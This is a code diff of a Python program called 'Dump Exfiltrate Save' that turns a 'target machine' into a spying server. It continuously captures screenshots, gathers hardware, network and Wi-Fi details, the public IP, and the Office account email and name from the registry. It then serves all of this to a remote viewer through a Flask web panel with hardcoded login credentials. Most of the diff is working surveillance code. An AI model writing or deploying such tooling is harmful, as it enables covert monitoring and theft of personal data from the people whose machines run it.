@@ -5,7 +5,7 @@ import time
 import socket
 import io
 from collections import deque
-from flask import Flask, Response, render_template_string, send_file, jsonify, request
+from flask import Flask, Response, render_template_string, send_file, jsonify, request, redirect, url_for, make_response
 import mss
 from PIL import Image
 import platform
@@ -15,9 +15,6 @@ import requests
 import winreg
 import random
 import hashlib
-
-""" COSTANT: 'app' is a costant with the flask app function form the imported library 'flask' """
-app = Flask(__name__)
 
 """ 
 FUNCION: makeProgramDir
@@ -60,7 +57,104 @@ def capture_images():
             time.sleep(max(0, 1/120 - elapsed))
 
 """ COSTANT: 'images' global list variable """
+#=^.^=
 images = deque(maxlen=5)
+
+""" 
+FUNCION: scan_wifi
+Function explanation:
+It uses the 'subprocess' module to execute a command, in this case 'netsh wlan show all' 
+Command 'netsh wlan show all':
+-Netsh : Network Shell 
+-Wlan : Wifi interface
+-Show : function to show informations about the selected interface
+-All : Show all the data and settings
+"""
+#=^.^=
+def scan_wifi():
+    try:
+        result = subprocess.check_output(["netsh", "wlan", "show", "all"], encoding='utf-8')
+        return result
+    except Exception as e:
+        return str(e)
+
+""" 
+FUNCTION: get_public_ip
+Function explanation:
+It sends a get request with the imported module 'requests' to the api site 'https://api.ipify.org'
+"""
+#=^.^=
+def get_public_ip():
+    try:
+        return requests.get('https://api.ipify.org').content.decode('utf8')
+    except requests.RequestException as e:
+        return f"Error getting public IP: {str(e)}"
+
+"""
+FUNCTION: get_local_network_info
+Function explanation:
+It uses the imported module 'subprocess' to run a command, in this case the command is 'ipconfig /all'
+"""
+#=^.^=
+def get_local_network_info():
+    try:
+        result = subprocess.run(["ipconfig", "/all"], capture_output=True, text=True, check=True)
+        return result.stdout  
+    except subprocess.CalledProcessError as e:
+        return f"Error executing command: {str(e)}"
+    except Exception as e:
+        return f"An error occurred: {str(e)}"
+    
+"""
+FUNCTION: get_registry_values
+Function explanation:
+Get registry values from the assigned path and the assigned key by the registry editor (regedit)
+"""
+######################################################################################################
+def get_registry_values(path, key):
+    try:
+        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, path) as keyHandle:
+            return winreg.QueryValueEx(keyHandle, key)[0]
+    except FileNotFoundError:
+        return None
+    except Exception as e:
+        return str(e)
+
+"""FUNCTION: get_user_info_from_registry
+Function explanation:
+Uses the 'get_registry_values' function to retrieve values and store it in variables
+"""
+######################################################################################################
+def get_user_info_from_registry():
+    userInfo = {}
+    registryPath = r"Software\\Microsoft\\Office\\16.0\\Common\\Identity\\Identities"
+    try:
+        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, registryPath) as parentKey:
+            i = 0
+            while True:
+                try:
+                    subkeyName = winreg.EnumKey(parentKey, i)
+                    subkeyPath = f"{registryPath}\\{subkeyName}"
+                    with winreg.OpenKey(winreg.HKEY_CURRENT_USER, subkeyPath) as subkey:
+                        email = get_registry_values(subkeyPath, "EmailAddress")
+                        if email:
+                            userInfo["EmailAddress"] = email
+                        firstName = get_registry_values(subkeyPath, "FirstName")
+                        if firstName:
+                            userInfo["FirstName"] = firstName
+                        lastName = get_registry_values(subkeyPath, "LastName")
+                        if lastName:
+                            userInfo["LastName"] = lastName
+                        if len(userInfo) == 3:
+                            break
+                except OSError:
+                    break
+                i += 1
+    except Exception as e:
+        userInfo['Error'] = str(e)
+    
+    return userInfo
+######################################################################################################
 
 """
 FUNCTION: get_local_ip
@@ -77,12 +171,15 @@ def get_local_ip():
     return socket.gethostbyname(socket.gethostname())
 
 """ COSTANT: 'SERVER_HOST' is a costant with the local ip of the target machine """
+#=^.^=
 SERVER_HOST = get_local_ip()
 
-""" COSTANT: 'SERVER_PORT' is a costant with a default port assigned from the developer"""
+""" COSTANT: 'SERVER_PORT' is a costant with a default port assigned from the developer """
+#=^.^=
 SERVER_PORT = 31338
 
 """ COSTANT: 'login_page' is a costant with the login page html code """
+#=^.^=
 login_page = f"""<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -93,39 +190,21 @@ login_page = f"""<!DOCTYPE html>
     <meta name="dc.language" content="ita" scheme="RFC1766">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Dump Exfiltrate Save | DES</title>
-    <script>
-        function checkCredentials() {{
-            var YKMs6nmx7VcV63i = document.getElementById("m2SxXVmW3tWogiS").value;
-            var BeGhkaQXpn4UplY = document.getElementById("ozOSNlUtEYo4mts").value;
-            var hovAsGEJkOG0mIq = btoa(BeGhkaQXpn4UplY); 
-            var KDKl8J3Ih7uU0l2 = btoa(YKMs6nmx7VcV63i)
-
-            if (KDKl8J3Ih7uU0l2 === "UERFUy1BZG1pbg==" && hovAsGEJkOG0mIq === "UERFUy1QYXNzd29yZA==") {{
-                alert("Login successful");
-                window.location.replace("http://{SERVER_HOST}:{SERVER_PORT}/4ee1711430410e5f2ec9d8188ac1f134");
-            }} else {{
-                alert("Invalid username or password");
-            }}
-        }}
-    </script>
 </head>
 <body>
     <h2>Admin Login</h2>
-    <form onsubmit="event.preventDefault(); checkCredentials();">
-        <div>
-            <label for="">Username:</label>
-            <input type="text" id="m2SxXVmW3tWogiS" name="">
-        </div>
-        <div>
-            <label for="password">Password:</label>
-            <input type="password" id="ozOSNlUtEYo4mts" name="">
-        </div>
-        <div>
-            <button type="submit">Login</button>
-        </div>
+    <form action="/login" method="post">
+        <label for="username">Username:</label>
+        <input type="text" id="username" name="username" required>
+        <br>
+        <label for="password">Password:</label>
+        <input type="password" id="password" name="password" required>
+        <br>
+        <button type="submit">Login</button>
     </form>
 </body>
-</html>"""
+</html>
+"""
 
 """ COSTANT: 'dashboard_page' is a costant with the dashboard page html code """
 dashboard_page = f"""<!DOCTYPE html>
@@ -186,127 +265,125 @@ dashboard_page = f"""<!DOCTYPE html>
         <p>Hey, we have another page for the PC information. If you want them go to <a href="/16f0ada2144eaa0b96478073d5e3d78b">this page</a></p>
     </div>
 </body>
+</html>
+"""
+
+#######################################################################
+info_page = f"""<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="author" content="Fedi6431">
+    <meta name="description" content="The Project Dump Exfiltrate Save (P-DES) is a project made by Fede to retrieve informations & PC usages">
+    <meta name="copyright" content="Fedi 2025©">
+    <meta name="dc.language" content="ita" scheme="RFC1766">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dump Exfiltrate Save | DES</title>
+</head>
+<body>
+    <h1> Informations </h1>
+    <ul>
+        <li><a href="#username">Username</a></li>
+        <li><a href="#os">Operating System</a></li>
+        <li><a href="#cpu">Cpu</a></li>
+        <li><a href="#memory">Memory</a></li>
+        <li><a href="#wifi">network</a></li>
+    </ul>
+    <h2 id="username">Username</h2>
+    <p>{os.getlogin()}</p>
+    <h2 id="os">Operating system infromations</h2>
+    <h3>Operating System</h3>
+    <p>{platform.system()}</p>
+    <h3>OS Version</h3>
+    <p>{platform.version()}</p>
+    <h3>Architecture</h3>
+    <p>{platform.architecture()}</p>
+    <h2 id="cpu">Cpu informations</h2>
+    <h3>Processor</h3>
+    <p>{platform.processor()}</p>
+    <h3>CPU cores</h3>
+    <p>{psutil.cpu_count(logical=False)}</p>
+    <h3>Logical CPUs</h3>
+    <p>{psutil.cpu_count(logical=True)}</p>
+    <h2 id="memory">Memory infromations</h2>
+    <h3>Memory</h3>
+    <p>{psutil.virtual_memory().total / (1024 ** 3):.2f} GB</p>
+    <h3>Used memory</h3>
+    <p>{psutil.virtual_memory().used / (1024 ** 3):.2f} GB</p>
+    <h3>Free memory</h3>
+    <p>{psutil.virtual_memory().available / (1024 ** 3):.2f} GB</p>
+    <h3>Disk usage</h3>
+    <p>{psutil.disk_usage('/').total / (1024 ** 3):.2f} GB</p>
+    <h3>Used disk</h3>
+    <p>{psutil.disk_usage('/').used / (1024 ** 3):.2f} GB</p>
+    <h3>Free disk</h3>
+    <p>{psutil.disk_usage('/').free / (1024 ** 3):.2f} GB</p>
+    <h2 id="wifi">Wifi informations</h2>
+    <h3>Hostname</h3>
+    <p>{socket.gethostname()}</p>
+    <h3>IP Address</h3>
+    <p>{get_local_ip()}</p>
+    <h3>Public IP</h3>
+    <p>{get_public_ip()}</p>
+    <h3>Local Network Info</h3>
+    <p>{get_local_network_info()}</p>
+    <h3>WiFi Networks</h3>
+    <p>{scan_wifi()}</p>
+</body>
 </html>"""
 
-""" 
-FUNCION: scan_wifi
-Function explanation:
-It uses the 'subprocess' module to execute a command, in this case 'netsh wlan show all' 
-Command 'netsh wlan show all':
--Netsh : Network Shell 
--Wlan : Wifi interface
--Show : function to show informations about the selected interface
--All : Show all the data and settings
-"""
+""" COSTANT: 'random_access_value' random value generator for cookies """
 #=^.^=
-def scan_wifi():
-    try:
-        result = subprocess.check_output(["netsh", "wlan", "show", "all"], encoding='utf-8')
-        return result
-    except Exception as e:
-        return str(e)
-
-""" 
-FUNCTION: get_public_ip
-Function explanation:
-It sends a get request with the imported module 'requests' to the api site 'https://api.ipify.org'
-"""
-#=^.^=
-def get_public_ip():
-    try:
-        return requests.get('https://api.ipify.org').content.decode('utf8')
-    except requests.RequestException as e:
-        return f"Error getting public IP: {str(e)}"
-
-"""
-FUNCTION: get_local_network_info
-Function explanation:
-It uses the imported module 'subprocess' to run a command, in this case the command is 'ipconfig /all'
-"""
-#=^.^=
-def get_local_network_info():
-    try:
-        result = subprocess.run(["ipconfig", "/all"], capture_output=True, text=True, check=True)
-        return result.stdout  
-    except subprocess.CalledProcessError as e:
-        return f"Error executing command: {str(e)}"
-    except Exception as e:
-        return f"An error occurred: {str(e)}"
-"""
-FUNCTION: get_registry_values
-Function explanation:
-Get registry values from the assigned path and the assigned key by the registry editor (regedit)
-"""
-def get_registry_values(path, key):
-    try:
-        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, path) as keyHandle:
-            return winreg.QueryValueEx(keyHandle, key)[0]
-    except FileNotFoundError:
-        return None
-    except Exception as e:
-        return str(e)
-
-"""FUNCTION: get_user_info_from_registry
-Function explanation:
-Uses the 'get_registry_values' function to retrieve values and store it in variables"""
-def get_user_info_from_registry():
-    userInfo = {}
-    registryPath = r"Software\\Microsoft\\Office\\16.0\\Common\\Identity\\Identities"
-    try:
-        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, registryPath) as parentKey:
-            i = 0
-            while True:
-                try:
-                    subkeyName = winreg.EnumKey(parentKey, i)
-                    subkeyPath = f"{registryPath}\\{subkeyName}"
-                    with winreg.OpenKey(winreg.HKEY_CURRENT_USER, subkeyPath) as subkey:
-                        email = get_registry_values(subkeyPath, "EmailAddress")
-                        if email:
-                            userInfo["EmailAddress"] = email
-                        firstName = get_registry_values(subkeyPath, "FirstName")
-                        if firstName:
-                            userInfo["FirstName"] = firstName
-                        lastName = get_registry_values(subkeyPath, "LastName")
-                        if lastName:
-                            userInfo["LastName"] = lastName
-                        if len(userInfo) == 3:
-                            break
-                except OSError:
-                    break
-                i += 1
-    except Exception as e:
-        userInfo['Error'] = str(e)
-    
-    return userInfo
-
-""" COSTANT: 'random_access_value' random value generator for cookies"""
 random_access_value = str(hashlib.sha256(str(random.randint(0,100000000001)).encode()).hexdigest())
 admin_access_value = str(hashlib.sha256(("admin" + str(random.randint(0,100000000001))).encode()).hexdigest())
 
-""" FLASK APP PAGES """
+""" COSTANT: 'credentials' is a dictonary with the credentials """
+#=^.^=
+credentials = {
+    "PDES-Admin" : "PDES-Password"
+}
+
+""" COSTANT: 'app' is a costant with the flask app function form the imported library 'flask' """
+#=^.^=
+app = Flask(__name__)
+
 """ '/' PATH: Login path """
+#=^.^=
 @app.route('/')
-def login():
-    response = app.make_response(render_template_string(login_page))
-    response.set_cookie("^.^", random_access_value, max_age=60*60*1)
+def home():
+    response = make_response(render_template_string(login_page))
     return response
+
+#=^.^=
+@app.route('/login', methods=['POST'])
+def login():
+    username = request.form['username']
+    password = request.form['password']
+
+    if username in credentials and credentials[username] == password:
+        response = make_response(redirect(url_for('dashboard')))
+        response.set_cookie('UwU', admin_access_value, max_age=60*60*1)
+        return response
+    else:
+        return "Invalid credentials", 401
 
 """ '/4ee1711430410e5f2ec9d8188ac1f134' PATH: Dashboard path """
 @app.route('/4ee1711430410e5f2ec9d8188ac1f134')
 def dashboard():
     response = app.make_response(render_template_string(dashboard_page))
-    userCookie = request.cookies.get("^.^")
-    if userCookie == random_access_value:
+    userCookie = request.cookies.get("UwU")
+    if userCookie == admin_access_value:
         return response
     else:
         return "403 Forbitten", 403
 
 """ '/image.png' PATH: Path used to store images """
+#=^.^=
 @app.route('/image.png')
 def image():
     response = app.make_response(Response(images[-1], mimetype='image/png'))
-    userCookie = request.cookies.get("^.^")
-    if userCookie == random_access_value:
+    userCookie = request.cookies.get("UwU")
+    if userCookie == admin_access_value:
         if images:
             return response
         return "404 Not Found", 404
@@ -315,43 +392,28 @@ def image():
 
 
 """ '/download.png' PATH: Path used to download the stored images """
+#=^.^=
 @app.route('/download.png')
 def download_image():
     response = app.make_response(send_file(io.BytesIO(images[-1]), mimetype='image/png', as_attachment=True, download_name='screenshot.png'))
-    userCookie = request.cookies.get("^.^")
-    if userCookie == random_access_value:
+    userCookie = request.cookies.get("UwU")
+    if userCookie == admin_access_value:
         if images:
             return response
         return "404 Not Found", 404
     else:
         return "403 Forbitten", 403
 
-""" '//16f0ada2144eaa0b96478073d5e3d78b' PATH: Path used to store system informations """
-"""@app.route('/16f0ada2144eaa0b96478073d5e3d78b')
+""" '/16f0ada2144eaa0b96478073d5e3d78b' PATH: Path used to store system informations """
+#=^.^=
+app.route('/16f0ada2144eaa0b96478073d5e3d78b')
 def informations():
-    user_login = os.getlogin()  # Get the current logged-in username
-    wifi_list = scan_wifi()  # Get the list of available Wi-Fi networks
-    system_info = {
-        "Username": user_login,
-        "Operating System": platform.system(),
-        "OS Version": platform.version(),
-        "Architecture": platform.architecture(),
-        "Processor": platform.processor(),
-        "CPU Cores": psutil.cpu_count(logical=False),
-        "Logical CPUs": psutil.cpu_count(logical=True),
-        "Memory": f"{psutil.virtual_memory().total / (1024 ** 3):.2f} GB",
-        "Used Memory": f"{psutil.virtual_memory().used / (1024 ** 3):.2f} GB",
-        "Free Memory": f"{psutil.virtual_memory().available / (1024 ** 3):.2f} GB",
-        "Disk Usage": f"{psutil.disk_usage('/').total / (1024 ** 3):.2f} GB",
-        "Used Disk": f"{psutil.disk_usage('/').used / (1024 ** 3):.2f} GB",
-        "Free Disk": f"{psutil.disk_usage('/').free / (1024 ** 3):.2f} GB",
-        "Hostname": socket.gethostname(),  # Get the hostname of the machine
-        "IP Address": get_local_ip(),  # Get the local IP address
-        "Public IP": get_public_ip(),  # Get the public IP address
-        "Local Network Info": get_local_network_info(),  # Get local network configuration
-        "WiFi Networks": wifi_list,  # List of available Wi-Fi networks
-    }
-    return jsonify(system_info) """
+    response = app.make_response(render_template_string(info_page))
+    userCookie = request.cookies.get("UwU")
+    if userCookie == admin_access_value:
+        return response
+    else:
+        return "403 Forbitten", 403
 
 if __name__ == "__main__":
     makeProgramDir()
